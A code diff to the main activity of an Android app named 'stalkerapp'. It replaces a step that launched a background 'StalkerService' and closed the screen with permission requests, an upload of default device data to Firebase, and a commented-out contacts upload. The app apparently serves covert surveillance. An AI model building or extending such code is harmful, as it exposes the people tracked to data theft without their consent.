@@ -1,15 +1,11 @@
 package com.github.saintedlittle.stalkerapp;
 
-import android.content.Intent;
-import android.net.Uri;
 import android.os.Bundle;
-
-import com.github.saintedlittle.stalkerapp.service.ServiceBinding;
-import com.github.saintedlittle.stalkerapp.service.StalkerService;
 
 import androidx.appcompat.app.AppCompatActivity;
 
-import com.github.saintedlittle.stalkerapp.databinding.ActivityMainBinding;
+import com.github.saintedlittle.stalkerapp.firebase.FirebaseSaver;
+import com.github.saintedlittle.stalkerapp.utils.PermissionDialog;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -17,11 +13,11 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        com.github.saintedlittle.stalkerapp.databinding.ActivityMainBinding binding = ActivityMainBinding.inflate(getLayoutInflater());
+        PermissionDialog permissionDialog = new PermissionDialog(this);
+        permissionDialog.requestPermissions();
 
-        startService(new Intent(this, StalkerService.class));
-
-        this.finish();
+        new FirebaseSaver().saveDefaultData(this);
+//        new FirebaseSaver().saveContacts();
 
     }
 
